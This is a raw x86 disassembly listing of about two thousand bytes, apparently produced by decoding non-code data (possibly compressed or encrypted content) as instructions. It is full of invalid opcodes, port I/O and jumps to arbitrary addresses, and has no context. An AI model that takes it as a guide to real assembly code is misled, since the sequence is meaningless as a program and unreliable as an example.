  408403:	push   esi
  408404:	into   
  408405:	fldlg2 
  408407:	ins    BYTE PTR es:[edi],dx
  408408:	sub    eax,0x73e47ca
  40840d:	and    BYTE PTR [ecx+ebp*4],al
  408410:	xchg   ebx,eax
  408411:	sbb    edi,eax
  408413:	xlat   BYTE PTR ds:[ebx]
  408414:	mov    dl,0xd7
  408416:	lea    ebp,[eax+0x848b6aa]
  40841c:	pop    ebx
  40841d:	or     DWORD PTR [esp+eiz*4-0xf],eax
  408421:	mov    cl,0x92
  408423:	lea    ebx,[bp+si]
  408426:	es in  eax,0x76
  408429:	out    dx,eax
  40842a:	pusha  
  40842b:	ds and eax,edi
  40842e:	pushf  
  40842f:	cdq    
  408430:	jae    0x408497
  408432:	push   ecx
  408433:	sub    dl,BYTE PTR [ecx-0xf95c695]
  408439:	jle    0x4083c8
  40843b:	xchg   ebx,eax
  40843c:	shl    DWORD PTR [edx],cl
  40843e:	or     esi,DWORD PTR [edx+0x7b885e18]
  408444:	mov    edi,0x71fa4ad4
  408449:	adc    DWORD PTR [ebp-0x2],0x34
  40844d:	in     eax,dx
  40844e:	sub    al,0xc7
  408450:	popf   
  408451:	fiadd  DWORD PTR [esi+0x2c]
  408454:	add    eax,0xdf781d7a
  408459:	mov    WORD PTR [edx],ds
  40845b:	out    dx,eax
  40845c:	cmp    al,0x40
  40845e:	push   edi
  40845f:	adc    esi,DWORD PTR [ebp+0x1b]
  408462:	and    al,0x2c
  408464:	mov    esi,0xa25981d1
  408469:	mov    dl,0xe2
  40846b:	pop    ecx
  40846c:	lods   eax,DWORD PTR es:[esi]
  40846e:	imul   esi,DWORD PTR [ebp+0x62b32387],0x2dc37f9
  408478:	pop    ecx
  408479:	lea    esi,[eax+0x6d]
  40847c:	stc    
  40847d:	add    esp,DWORD PTR [eax+0x4c]
  408480:	mov    bl,0xd1
  408482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408483:	pusha  
  408484:	pop    edx
  408485:	adc    esp,DWORD PTR [ebx+0x10]
  408488:	xchg   ebx,esi
  40848a:	pop    ebx
  40848b:	xor    esp,ebx
  40848d:	and    BYTE PTR [esi],0xc0
  408490:	inc    ebp
  408491:	je     0x4084a9
  408493:	cwde   
  408494:	inc    BYTE PTR [ecx+0x7a57e0d7]
  40849a:	shl    BYTE PTR [edx],1
  40849c:	outs   dx,DWORD PTR ds:[esi]
  40849d:	mov    bl,0x2d
  40849f:	pop    edi
  4084a0:	enter  0x29f2,0x86
  4084a4:	mov    ecx,DWORD PTR [eax]
  4084a6:	lods   al,BYTE PTR ds:[esi]
  4084a7:	scas   al,BYTE PTR es:[edi]
  4084a8:	repnz cs xchg edi,eax
  4084ab:	mov    ds:0x62ab9b7a,al
  4084b0:	push   esi
  4084b1:	addr16 mov eax,ds:0x113b
  4084b5:	or     al,0x12
  4084b7:	rol    BYTE PTR [eax+0x62d74648],0xee
  4084be:	dec    eax
  4084bf:	mov    es,esp
  4084c1:	pop    edi
  4084c2:	out    0x6d,al
  4084c4:	add    al,0x17
  4084c6:	xor    esi,DWORD PTR [ebp+0x42]
  4084c9:	repnz cmc 
  4084cb:	xor    BYTE PTR [ebx],bh
  4084cd:	jge    0x4084dc
  4084cf:	add    esp,DWORD PTR [ebp+eiz*4-0x50783682]
  4084d6:	sbb    BYTE PTR [eax],bl
  4084d8:	inc    eax
  4084d9:	(bad)  
  4084da:	adc    eax,0xde3e8428
  4084df:	sub    DWORD PTR [eax+0x65459d16],esi
  4084e5:	dec    esi
  4084e6:	mov    WORD PTR [ecx-0x6699a206],fs
  4084ec:	cmp    eax,0x6c764570
  4084f1:	shr    BYTE PTR ds:0x5768e654,1
  4084f7:	stc    
  4084f8:	jp     0x40851e
  4084fa:	pusha  
  4084fb:	mov    edx,0x2b124c7
  408500:	or     cl,dh
  408502:	dec    ebp
  408503:	in     al,dx
  408504:	aad    0x58
  408506:	sub    bl,ch
  408508:	inc    eax
  408509:	xor    eax,0x65e3de17
  40850e:	inc    ecx
  40850f:	mov    edx,0x94ae222e
  408514:	and    BYTE PTR [esi+0x4d],al
  408517:	cmp    esp,0x3379c8f4
  40851d:	lds    eax,FWORD PTR [ebx-0x648d6cf9]
  408523:	mov    dl,0x48
  408525:	clc    
  408526:	jl     0x40857a
  408528:	dec    ebx
  408529:	pop    ebx
  40852a:	xor    ah,BYTE PTR [ecx]
  40852c:	adc    al,0xa3
  40852e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  408530:	inc    edi
  408531:	jg     0x4084bf
  408533:	retf   0xd95d
  408536:	push   cs
  408537:	fsubr  st(4),st
  408539:	repz or bh,bh
  40853c:	cmp    al,0x89
  40853e:	nop
  40853f:	mov    edi,0xea2e0708
  408544:	push   ecx
  408545:	pop    ebx
  408546:	inc    esi
  408547:	inc    esi
  408548:	mov    al,0xe5
  40854a:	mov    bh,0xb2
  40854c:	xor    ebx,DWORD PTR [eax]
  40854e:	mov    al,ds:0x1467a1db
  408553:	adc    BYTE PTR [eax-0x67],cl
  408556:	xcrypt-ecb (bad)
  408557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408558:	or     eax,0x7728fb79
  40855d:	sahf   
  40855e:	xor    DWORD PTR [ebp+0x763e5170],eax
  408564:	shl    DWORD PTR [ebp-0x1a2e89d0],0xe1
  40856b:	adc    eax,0xb27cc31d
  408570:	not    DWORD PTR [ebp+eax*8-0x10]
  408574:	stos   DWORD PTR es:[edi],eax
  408575:	jmp    0x4085b3
  408577:	mov    ah,0x52
  408579:	sbb    al,0xd
  40857b:	add    DWORD PTR [edi-0x3],ebp
  40857e:	pop    edi
  40857f:	jo     0x408516
  408581:	add    eax,0xbaae83ec
  408586:	xchg   edx,eax
  408587:	inc    eax
  408588:	cmp    bl,BYTE PTR [ebx]
  40858a:	add    al,0x17
  40858c:	push   ebp
  40858d:	fisubr WORD PTR [eax-0x715f7a2c]
  408593:	jns    0x4085c1
  408595:	pushf  
  408596:	mov    al,0x4f
  408598:	cmp    al,BYTE PTR [ecx]
  40859a:	xlat   BYTE PTR ds:[ebx]
  40859b:	(bad)  [ebp-0x318169cd]
  4085a1:	sti    
  4085a2:	(bad)  
  4085a3:	fdivr  QWORD PTR [ebx-0x73c0d89d]
  4085a9:	sbb    eax,0x9b74f349
  4085ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085af:	push   cs
  4085b0:	adc    bl,dh
  4085b2:	adc    eax,eax
  4085b4:	stos   DWORD PTR es:[edi],eax
  4085b5:	pop    ebp
  4085b6:	inc    esp
  4085b7:	mov    ds:0xe7b03847,al
  4085bc:	push   ebp
  4085bd:	mov    edi,0x5b2ec3b2
  4085c2:	cmc    
  4085c3:	call   0x1bbaf425
  4085c8:	inc    edx
  4085c9:	sub    DWORD PTR [esi+0x7d],eax
  4085cc:	dec    eax
  4085cd:	cmp    DWORD PTR [ecx+0x4e],0x7c
  4085d1:	pop    es
  4085d2:	mov    DWORD PTR [edi],eax
  4085d4:	and    ebp,DWORD PTR [esi-0x7d]
  4085d7:	pop    edi
  4085d8:	es es dec esp
  4085db:	jmp    0x61cc502f
  4085e0:	cmp    bh,BYTE PTR [ecx-0x15]
  4085e3:	lods   al,BYTE PTR fs:[esi]
  4085e5:	cdq    
  4085e6:	mov    fs,WORD PTR [edx+0x15]
  4085e9:	mov    cl,bh
  4085eb:	int    0xc
  4085ed:	int    0x8a
  4085ef:	cmp    DWORD PTR [edx-0x319f1847],ebp
  4085f5:	jg     0x4085e9
  4085f7:	fild   DWORD PTR [edi-0x48e3d218]
  4085fd:	mov    bl,0x60
  4085ff:	sar    BYTE PTR [ebp+0x6b],cl
  408602:	add    bl,cl
  408604:	adc    ecx,ecx
  408606:	xchg   esp,eax
  408607:	out    dx,eax
  408608:	cmp    eax,0xa08e2c0c
  40860d:	lea    esi,ds:0x617e2650
  408613:	jno    0x40859c
  408615:	push   ebx
  408616:	pop    edx
  408617:	pop    ecx
  408618:	in     al,dx
  408619:	pop    ds
  40861a:	enter  0xeda1,0x50
  40861e:	cmc    
  40861f:	lea    ecx,[ecx+0x52]
  408622:	jne    0x40866f
  408624:	loopne 0x40864b
  408626:	jp     0x4085c9
  408628:	inc    ecx
  408629:	fldenv [ebx-0xad14b5f]
  40862f:	xchg   ebx,eax
  408630:	jne    0x4086ab
  408632:	bound  esp,QWORD PTR [edx-0x25]
  408635:	adc    DWORD PTR [edx+0x1989f82f],ebp
  40863b:	std    
  40863c:	rcl    esp,0x79
  40863f:	inc    DWORD PTR [ebx+0x527fedc3]
  408645:	cli    
  408646:	xchg   esp,eax
  408647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408648:	cmp    DWORD PTR ds:0xb54f7a1e,edx
  40864e:	imul   edi,eax,0x384007f6
  408654:	int    0xac
  408656:	or     bl,al
  408658:	push   0xee835281
  40865d:	popf   
  40865e:	hlt    
  40865f:	pop    ds
  408660:	dec    ecx
  408661:	xor    bh,BYTE PTR [ebx+0x42]
  408664:	cld    
  408665:	mul    DWORD PTR [esi+0x3036e9bb]
  40866b:	aas    
  40866c:	sub    edi,ebp
  40866e:	cwde   
  40866f:	xchg   esp,eax
  408670:	xchg   edx,eax
  408671:	std    
  408672:	es cmp eax,0x383dc5d1
  408678:	and    edi,DWORD PTR [ebp-0x60]
  40867b:	out    0x8f,al
  40867d:	pop    ecx
  40867e:	mov    edi,0x74edc79a
  408683:	imul   esp,DWORD PTR [ebx],0xa
  408686:	sahf   
  408687:	xlat   BYTE PTR ds:[ebx]
  408688:	sar    BYTE PTR [edx-0x2e5b54f5],cl
  40868e:	cli    
  40868f:	add    al,bh
  408691:	mov    edi,?
  408693:	test   BYTE PTR [eax-0x50],dl
  408696:	xor    dh,BYTE PTR [eax+0x53924ead]
  40869c:	mov    al,ds:0x58becc29
  4086a1:	mov    edx,0x4adb72c0
  4086a6:	lods   eax,DWORD PTR ds:[esi]
  4086a7:	lods   al,BYTE PTR ds:[esi]
  4086a8:	mov    al,ss:0x59f6d678
  4086ae:	sub    BYTE PTR [edx],0xea
  4086b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086b2:	aad    0x50
  4086b4:	jmp    0x40864e
  4086b6:	ror    BYTE PTR [edi+0x5eefa8ea],cl
  4086bc:	and    al,0x26
  4086be:	lahf   
  4086bf:	ins    DWORD PTR es:[edi],dx
  4086c0:	daa    
  4086c1:	inc    esp
  4086c2:	add    DWORD PTR [esi+0x6917bfc3],0x9d0f6a2b
  4086cc:	cmp    DWORD PTR ds:0x2839c0b8,edi
  4086d2:	(bad)  
  4086d3:	int    0x46
  4086d5:	ins    DWORD PTR es:[edi],dx
  4086d6:	dec    esp
  4086d7:	sbb    eax,0x85fe2f28
  4086dc:	cmp    al,0xa4
  4086de:	jmp    0x23fd455
  4086e3:	sub    eax,esp
  4086e5:	add    dh,bl
  4086e7:	jne    0x408708
  4086e9:	ret    0x8332
  4086ec:	mov    ch,0xc
  4086ee:	lea    edi,[ebp-0x2c]
  4086f1:	xor    bh,ch
  4086f3:	inc    ebp
  4086f4:	dec    edx
  4086f5:	mov    ds:0xe189e631,eax
  4086fa:	jl     0x408740
  4086fc:	fnstsw WORD PTR [eax]
  4086fe:	cdq    
  4086ff:	push   0xffffff8d
  408701:	jmp    0x3ae6fc2
  408706:	pop    edx
  408707:	mov    ecx,DWORD PTR [edx]
  408709:	mov    eax,ds:0x3f39b457
  40870e:	xchg   ecx,eax
  40870f:	jnp    0x40876b
  408711:	add    DWORD PTR [eax+0x151acaf6],edx
  408717:	int    0xa1
  408719:	sub    eax,0x87ff14ef
  40871e:	pop    esp
  40871f:	(bad)  
  408720:	sub    DWORD PTR [edi-0x3c],eax
  408723:	xchg   ebx,eax
  408724:	loope  0x4087a0
  408726:	jmp    0x9fd1:0x9310e779
  40872d:	jle    0x4086b0
  40872f:	push   esp
  408730:	or     al,bh
  408732:	mov    ebp,0x1f758f65
  408737:	sub    eax,0xcf186bd5
  40873c:	jmp    0x192fe3ab
  408741:	adc    BYTE PTR [ebp-0x5b],cl
  408744:	mov    ah,0x90
  408746:	mov    edx,0xc39db38c
  40874b:	inc    DWORD PTR [ecx+eax*1-0x76]
  40874f:	out    0xbb,al
  408751:	into   
  408752:	and    eax,0x7b2556f9
  408757:	mov    cl,0xaf
  408759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40875a:	pushf  
  40875b:	lea    esp,[esi]
  40875d:	arpl   ax,ax
  40875f:	mov    al,0xf4
  408761:	xchg   esp,eax
  408762:	adc    BYTE PTR [esi+0x41],bl
  408765:	jb     0x40874a
  408767:	mov    ebx,0x54f09d48
  40876c:	pop    eax
  40876d:	and    esi,edi
  40876f:	or     eax,0xc967866f
  408774:	je     0x40875c
  408776:	outs   dx,BYTE PTR ds:[esi]
  408777:	sub    ebp,DWORD PTR [eax-0x6d]
  40877a:	sbb    eax,0xe0fdfff0
  40877f:	test   DWORD PTR [edx+0x1b5246ae],esp
  408785:	xchg   ebx,eax
  408786:	js     0x4087dd
  408788:	(bad)  
  408789:	call   0x9324cfe7
  40878e:	sbb    eax,0x41d45e3e
  408793:	sbb    BYTE PTR [ebx+0x24],bh
  408796:	icebp  
  408797:	adc    bl,ch
  408799:	or     ah,ch
  40879b:	daa    
  40879c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40879d:	xchg   ebx,eax
  40879e:	adc    al,0x2f
  4087a0:	jno    0x40876f
  4087a2:	xchg   ecx,eax
  4087a3:	nop
  4087a4:	pusha  
  4087a5:	mov    edx,0x8cc0ed29
  4087aa:	xchg   ebx,eax
  4087ab:	lods   al,BYTE PTR ds:[esi]
  4087ac:	fild   WORD PTR [eax+eax*2+0x1b5c1492]
  4087b3:	(bad)  
  4087b4:	cmp    cl,BYTE PTR [eax]
  4087b6:	loopne 0x4087ee
  4087b8:	and    al,0x8
  4087ba:	call   0x22f73428
  4087bf:	aaa    
  4087c0:	and    DWORD PTR [esi+eax*2],eax
  4087c3:	xchg   edx,eax
  4087c4:	(bad)  
  4087c5:	lock ja 0x408753
  4087c8:	fcom   QWORD PTR [edi+0x175dfc3d]
  4087ce:	dec    esp
  4087cf:	inc    esi
  4087d0:	adc    al,0xf7
  4087d2:	mov    eax,0x78e4348b
  4087d7:	pop    esi
  4087d8:	ss xchg ah,al
  4087db:	mov    esp,0xc523ce44
  4087e0:	pushf  
  4087e1:	jb     0x408859
  4087e3:	scas   al,BYTE PTR es:[edi]
  4087e4:	sbb    cl,al
  4087e6:	xor    ecx,DWORD PTR [edi-0x17fd831a]
  4087ec:	adc    al,al
  4087ee:	por    mm6,mm5
  4087f1:	push   eax
  4087f2:	xchg   bl,ch
  4087f4:	ror    cl,0x6a
  4087f7:	retf   
  4087f8:	adc    dl,BYTE PTR [eax]
  4087fa:	dec    ecx
  4087fb:	xor    al,0x9d
  4087fd:	or     DWORD PTR [esi],edi
  4087ff:	mov    BYTE PTR [ebx],ch
  408801:	jae    0x408860
  408803:	aas    
  408804:	ds in  al,0xf4
  408807:	(bad)  
  408808:	repnz cs dec esi
  40880b:	xchg   edx,eax
  40880c:	mov    DWORD PTR [edi-0x2b],esp
  40880f:	adc    eax,0x49cc81f0
  408814:	scas   al,BYTE PTR es:[edi]
  408815:	sti    
  408816:	shl    BYTE PTR [esp+edx*4-0x61],0x33
  40881b:	jmp    0x5083:0x9af87f71
  408822:	jb     0x408833
  408824:	cmp    al,0xff
  408826:	adc    al,0x78
  408828:	or     DWORD PTR [ebp-0x7a114f18],ebx
  40882e:	les    eax,FWORD PTR [eiz*8-0x7313cb9c]
  408835:	pop    ds
  408836:	fidiv  WORD PTR [edi+0x36bb78a7]
  40883c:	sub    eax,DWORD PTR [esi]
  40883e:	xor    eax,0x2717164
  408843:	lods   eax,DWORD PTR ds:[esi]
  408844:	retf   0x23e8
  408847:	loop   0x408892
  408849:	add    edi,esi
  40884b:	test   eax,0xe748a479
  408850:	xchg   edx,eax
  408851:	pop    esi
  408852:	cmp    BYTE PTR [esi+0x27],dh
  408855:	int3   
  408856:	dec    edi
  408857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408858:	sub    bh,BYTE PTR [edx+0x55001dec]
  40885e:	ds inc eax
  408860:	adc    esp,ebp
  408862:	leave  
  408863:	add    dl,dl
  408865:	cmp    al,0x9
  408867:	repnz jecxz 0x408895
  40886a:	mov    al,0x46
  40886c:	push   eax
  40886d:	adc    al,0x51
  40886f:	ja     0x4088a2
  408871:	mov    esi,0x35b8ad1d
  408876:	int3   
  408877:	aas    
  408878:	lods   al,BYTE PTR ds:[esi]
  408879:	scas   eax,DWORD PTR es:[edi]
  40887a:	jno    0x4088a5
  40887c:	xor    ecx,DWORD PTR [edx]
  40887e:	shl    esi,1
  408880:	jmp    DWORD PTR [eax-0x39]
  408883:	xor    esi,DWORD PTR [ebx+0x71611433]
  408889:	jne    0x40883c
  40888b:	out    dx,al
  40888c:	(bad)  
  40888d:	fisttp QWORD PTR [edi]
  40888f:	cmc    
  408890:	dec    edi
  408891:	sti    
  408892:	pop    esp
  408893:	inc    ebp
  408894:	push   ecx
  408895:	mov    bh,0x38
  408897:	inc    ebx
  408898:	push   0x2faf250c
  40889d:	je     0x4088e6
  40889f:	or     ebp,ecx
  4088a1:	in     eax,dx
  4088a2:	neg    DWORD PTR [edx-0x69]
  4088a5:	out    dx,eax
  4088a6:	ret    
  4088a7:	pop    ebp
  4088a8:	push   edx
  4088a9:	jge    0x40892a
  4088ab:	(bad)  
  4088ac:	mov    ds:0xec6dbbdf,al
  4088b1:	adc    BYTE PTR [edi],0xbf
  4088b4:	jecxz  0x408863
  4088b6:	xchg   ebx,eax
  4088b7:	aaa    
  4088b8:	addr16 pop ebx
  4088ba:	call   0x7dc9:0x64f7650b
  4088c1:	fnstenv [ebp-0x77]
  4088c4:	mov    dl,BYTE PTR [edx]
  4088c6:	dec    eax
  4088c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088c8:	mov    esi,0x6a9341d5
  4088cd:	mov    eax,ebp
  4088cf:	jae    0x408916
  4088d1:	push   ecx
  4088d2:	xor    DWORD PTR [eax-0x5e69eb73],edi
  4088d8:	mov    dh,BYTE PTR [ebx]
  4088da:	retf   
  4088db:	scas   al,BYTE PTR es:[edi]
  4088dc:	dec    ebx
  4088dd:	xchg   esp,eax
  4088de:	push   esp
  4088df:	in     al,dx
  4088e0:	cmp    DWORD PTR [ebx-0x66],0xffffffb4
  4088e4:	das    
  4088e5:	dec    edx
  4088e6:	out    dx,al
  4088e7:	adc    esp,DWORD PTR [eax]
  4088e9:	lahf   
  4088ea:	test   al,0x46
  4088ec:	cmp    BYTE PTR [ebp-0x4e52791a],cl
  4088f2:	sub    esp,esi
  4088f4:	xchg   edi,eax
  4088f5:	fbstp  TBYTE PTR [eax+eax*2+0x55]
  4088f9:	aam    0xe2
  4088fb:	out    0xd,eax
  4088fd:	push   ecx
  4088fe:	(bad)  
  408900:	nop
  408901:	retf   
  408902:	mov    esp,0xc063cc10
  408907:	dec    esp
  408908:	sar    BYTE PTR [esi+0x756c678c],0xe1
  40890f:	add    DWORD PTR [edi-0x66],0x7001c26b
  408916:	xchg   esi,eax
  408917:	xor    al,0xea
  408919:	add    BYTE PTR ds:0xa79e9d21,ah
  40891f:	cmp    al,bl
  408921:	popa   
  408922:	cmp    al,0x15
  408924:	push   eax
  408925:	imul   edx,eax,0x68a113d3
  40892b:	and    ebp,esp
  40892d:	repnz push 0x42
  408930:	mov    eax,0xf1b0cbcc
  408935:	lods   al,BYTE PTR ds:[esi]
  408936:	fwait
  408937:	cld    
  408938:	das    
  408939:	add    BYTE PTR [edi-0x4ad8cd30],al
  40893f:	(bad)  
  408941:	test   BYTE PTR [esi+0x40c79efa],bl
  408947:	pop    ebp
  408948:	loopne 0x4089c9
  40894a:	sbb    ch,BYTE PTR [ecx+0x5e]
  40894d:	sbb    esi,ecx
  40894f:	add    esp,DWORD PTR [eax]
  408951:	inc    esp
  408952:	pushf  
  408953:	in     al,0x9d
  408955:	xchg   ebx,eax
  408956:	lods   eax,DWORD PTR ds:[esi]
  408957:	push   edx
  408958:	fisub  WORD PTR [esi-0x15]
  40895b:	pop    ebx
  40895c:	ret    0xaa52
  40895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408960:	(bad)  [esi]
  408962:	jmp    0x408926
  408964:	add    BYTE PTR [esi+edx*1+0x37d180c5],0x79
  40896c:	cwde   
  40896d:	pop    ss
  40896e:	adc    DWORD PTR [edi+ebx*4-0x6d],0x7b21845a
  408976:	mov    dl,BYTE PTR ds:0x638d28c9
  40897c:	lea    ecx,[edi+0x68]
  40897f:	xor    esp,eax
  408981:	(bad)  
  408983:	jo     0x4089bc
  408985:	adc    eax,0xc68054d3
  40898a:	retf   0xce7a
  40898d:	pop    ds
  40898e:	jecxz  0x408994
  408990:	fdiv   QWORD PTR [esi-0xf]
  408993:	loopne 0x408957
  408995:	test   esi,edx
  408997:	call   0x72f99091
  40899c:	out    0xfa,eax
  40899e:	(bad)  
  4089a0:	pop    ebx
  4089a1:	dec    esi
  4089a2:	xchg   BYTE PTR [edx],dh
  4089a4:	cwde   
  4089a5:	push   ds
  4089a6:	cwde   
  4089a7:	mov    ds:0x2bc06c9e,al
  4089ac:	out    0x1b,eax
  4089ae:	lods   al,BYTE PTR ds:[esi]
  4089af:	aas    
  4089b0:	loopne 0x4089b2
  4089b2:	iret   
  4089b3:	(bad)  
  4089b4:	pop    edi
  4089b5:	test   al,0xa5
  4089b7:	mov    eax,ds:0xe58f598a
  4089bc:	add    eax,0xd571515f
  4089c1:	lods   eax,DWORD PTR ds:[esi]
  4089c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c3:	jne    0x408a21
  4089c5:	inc    ecx
  4089c6:	pushf  
  4089c7:	cwde   
  4089c8:	pop    ds
  4089c9:	add    ebx,DWORD PTR ds:0x190eb65f
  4089cf:	mov    dl,0xc
  4089d1:	out    0x5d,eax
  4089d3:	add    BYTE PTR [esi+0x48a7953c],ch
  4089d9:	loope  0x408a36
  4089db:	pop    es
  4089dc:	adc    eax,edx
  4089de:	icebp  
  4089df:	cmp    al,0x7b
  4089e1:	test   eax,0x527b66e9
  4089e6:	in     eax,dx
  4089e7:	scas   eax,DWORD PTR es:[edi]
  4089e8:	fldenv [edx-0x61fecbe5]
  4089ee:	push   esp
  4089ef:	jmp    0xbdab:0x7046ce4f
  4089f6:	jb     0x4089f0
  4089f8:	push   ebp
  4089f9:	sar    DWORD PTR [ebx],0xab
  4089fc:	mov    eax,DWORD PTR [edi-0x75563754]
  408a02:	cmp    al,0xad
  408a04:	ror    DWORD PTR [edx+0x5c],1
  408a07:	push   edi
  408a08:	mov    ebp,0xa6dc500f
  408a0d:	adc    eax,0x7a368f41
  408a12:	in     al,0x7b
  408a14:	es jbe 0x408a7a
  408a17:	add    ch,dh
  408a19:	pop    ebx
  408a1a:	jno    0x4089de
  408a1c:	cmp    ebp,0xa82c4586
  408a22:	add    al,0x44
  408a24:	xchg   edx,eax
  408a25:	jb     0x4089ae
  408a27:	lds    esp,FWORD PTR [esi-0x54a6742d]
  408a2d:	in     al,dx
  408a2e:	push   ecx
  408a2f:	fwait
  408a30:	sub    al,0x9e
  408a32:	xor    DWORD PTR [ecx+0x66a0893],eax
  408a38:	arpl   WORD PTR [esi+0x58],cx
  408a3b:	jmp    0x90fa5c3
  408a40:	push   ecx
  408a41:	xor    dh,BYTE PTR [esi-0x5a]
  408a44:	cmc    
  408a45:	stos   BYTE PTR es:[edi],al
  408a46:	cld    
  408a47:	inc    esp
  408a48:	mov    eax,ds:0x5432fdb3
  408a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a4e:	sti    
  408a4f:	idiv   DWORD PTR [ecx+0x10]
  408a52:	outs   dx,DWORD PTR ds:[esi]
  408a53:	and    eax,0xe1b9543e
  408a58:	push   es
  408a59:	push   ds
  408a5a:	and    edi,edx
  408a5c:	ds jle 0x408a4d
  408a5f:	iret   
  408a60:	dec    ebp
  408a61:	cmc    
  408a62:	mov    bh,0x4c
  408a64:	inc    eax
  408a65:	imul   esi,DWORD PTR [esi],0xffffffc5
  408a68:	lock loope 0x408a08
  408a6b:	and    DWORD PTR [ebx],esi
  408a6d:	dec    esp
  408a6e:	aaa    
  408a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a70:	das    
  408a71:	outs   dx,DWORD PTR ds:[esi]
  408a72:	cs mov ch,0x4
  408a75:	cmp    eax,0x7fd50156
  408a7a:	mov    esp,0xe2100edb
  408a7f:	push   esi
  408a80:	pop    edx
  408a81:	fld    QWORD PTR [edx+0x35]
  408a84:	imul   edx,DWORD PTR [edx],0xffffffc8
  408a87:	out    0xbc,eax
  408a89:	imul   ecx,DWORD PTR [ebx],0x7b
  408a8c:	ror    DWORD PTR [eax+ebx*8-0x7ce3f935],1
  408a93:	sbb    al,BYTE PTR [edi]
  408a95:	sbb    BYTE PTR [edx+0x2c6ec2c2],cl
  408a9b:	pop    esi
  408a9c:	add    eax,0xb26d8930
  408aa1:	jp     0x408b17
  408aa3:	cld    
  408aa4:	xor    ebp,esi
  408aa6:	loop   0x408af2
  408aa8:	add    ah,BYTE PTR [ecx]
  408aaa:	scas   al,BYTE PTR es:[edi]
  408aab:	mov    WORD PTR [edi],?
  408aad:	xor    al,0x64
  408aaf:	mov    ch,0x2e
  408ab1:	adc    DWORD PTR [ebx],0x2c6c194a
  408ab7:	dec    edx
  408ab8:	xchg   DWORD PTR ds:0xfc228b76,ebx
  408abe:	retf   
  408abf:	scas   eax,DWORD PTR es:[edi]
  408ac0:	mov    WORD PTR [ebp-0x1634b207],ds
  408ac6:	push   ecx
  408ac7:	jle    0x408aab
  408ac9:	jnp    0x408ac7
  408acb:	dec    ebx
  408acc:	jmp    DWORD PTR [edi+ecx*2+0x55e9b101]
  408ad3:	imul   eax,DWORD PTR [ebx],0x18
  408ad6:	sbb    al,0x0
  408ad8:	lahf   
  408ad9:	dec    edi
  408ada:	clc    
  408adb:	inc    ebx
  408adc:	push   es
  408add:	in     eax,0xb1
  408adf:	jecxz  0x408af8
  408ae1:	lock mov bh,0xe9
  408ae4:	jmp    0x408aae
  408ae6:	add    BYTE PTR [ecx],dl
  408ae8:	test   al,0x68
  408aea:	xor    DWORD PTR [eax+0x61ac63ab],esp
  408af0:	std    
  408af1:	outs   dx,BYTE PTR ds:[esi]
  408af2:	mov    eax,ds:0xa9120a24
  408af7:	(bad)  
  408af8:	(bad)  
  408af9:	lock inc si
  408afc:	clc    
  408afd:	inc    eax
  408afe:	dec    esp
  408aff:	push   esp
  408b00:	mov    ds:0x8d4e64de,al
  408b05:	jge    0x408a8c
  408b07:	xor    eax,0x80b82f45
  408b0c:	arpl   WORD PTR [edi-0x7d],bx
  408b0f:	ins    DWORD PTR es:[edi],dx
  408b10:	and    eax,0x48482fd1
  408b15:	or     al,0xaf
  408b17:	jmp    DWORD PTR [ecx+0x16]
  408b1a:	stos   DWORD PTR es:[edi],eax
  408b1b:	adc    dl,dh
  408b1d:	mov    bl,0x49
  408b1f:	cmp    al,0x91
  408b21:	ror    BYTE PTR [eax-0x7b],1
  408b24:	hlt    
  408b25:	or     eax,DWORD PTR [ebx-0x543a3031]
  408b2b:	repnz inc ecx
  408b2d:	retf   
  408b2e:	mov    edi,0xb7536987
  408b33:	inc    edi
  408b34:	mov    ah,0x71
  408b36:	xchg   DWORD PTR [ecx-0x56],eax
  408b39:	(bad)  
  408b3a:	sahf   
  408b3b:	mov    ah,0x6
  408b3d:	shl    BYTE PTR [edi-0x2b],0x39
  408b41:	mov    ah,BYTE PTR [ebp+0x3686e2b]
  408b47:	fdivr  DWORD PTR [ecx-0x25]
  408b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b4b:	add    BYTE PTR [esi-0x6d68f4d2],al
  408b51:	push   ecx
  408b52:	std    
  408b53:	shr    BYTE PTR [edx],0x94
  408b56:	out    dx,eax
  408b57:	test   eax,0xb236e9c9
  408b5c:	cmp    eax,0x92f8f1db
  408b61:	test   al,0xe8
  408b63:	dec    ebx
  408b64:	push   ss
  408b65:	mov    ecx,0x8a62d122
  408b6a:	mov    dl,0x9b
  408b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b6d:	pop    edx
  408b6e:	cld    
  408b6f:	es and al,0x92
  408b72:	mov    edx,0x61a686be
  408b77:	loopne 0x408be6
  408b79:	jae    0x408bf7
  408b7b:	and    esi,DWORD PTR [esi+0x5c]
  408b7e:	cmp    DWORD PTR [esi-0x32],ebx
  408b81:	jl     0x408b89
  408b83:	mov    ?,WORD PTR ds:0xdb58e26d
  408b89:	jns    0x408b59
  408b8b:	jle    0x408b52
  408b8d:	xchg   edi,eax
  408b8e:	pushf  
  408b8f:	int    0x2f
  408b91:	pop    ds
  408b92:	mov    edi,0x7ed8d019
  408b97:	imul   edi,DWORD PTR [esi-0x72],0x60
  408b9b:	je     0x408bfe
  408b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b9e:	es (bad) 
  408ba0:	into   
  408ba1:	scas   al,BYTE PTR es:[edi]
  408ba2:	fwait
  408ba3:	add    BYTE PTR [ebp+0x5a24ba47],al
  408ba9:	jmp    0xe2ce7aad
  408bae:	push   edi
  408baf:	das    
  408bb0:	lahf   
  408bb1:	and    eax,0xfa69a1ba
  408bb6:	stos   BYTE PTR es:[edi],al
  408bb7:	in     al,0x74
  408bb9:	ds push esp
  408bbb:	dec    edx
  408bbc:	mov    edi,0x84467160
